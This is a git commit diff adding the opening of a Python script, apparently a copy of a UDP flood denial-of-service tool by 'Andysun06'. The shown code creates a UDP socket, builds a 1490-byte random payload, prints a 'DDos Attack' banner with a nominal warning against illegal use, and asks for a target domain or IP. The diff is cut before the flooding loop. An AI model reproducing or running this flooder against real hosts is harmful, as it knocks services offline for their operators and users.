4606ddaf9b22dab86192bad302c25aab877fd9f6
阿泽 <m15265789032@163.com>
2025-06-30 12:51:29 +0800

    更新 测试.py

--- 测试.py
+++ 测试.py
@@ -1,3 +1,38 @@
+# python3
+
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print (" ")
+print ("/---------------------------------------------------\\ ")
+print ("|   作者          : Andysun06                       |")
+print ("|   作者github    : https://github.com/Andysun06    |")
+print ("|   kali-QQ学习群 : 909533854                       |")
+print ("|   版本          : V1.1.0                          |")
+print ("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
+print ("\\---------------------------------------------------/")
+print (" ")
+print (" -----------------[请勿用于违法用途]----------------- ")
+print (" ")
+
 target = input("请输入目标域名或IP : ")
 
 try:
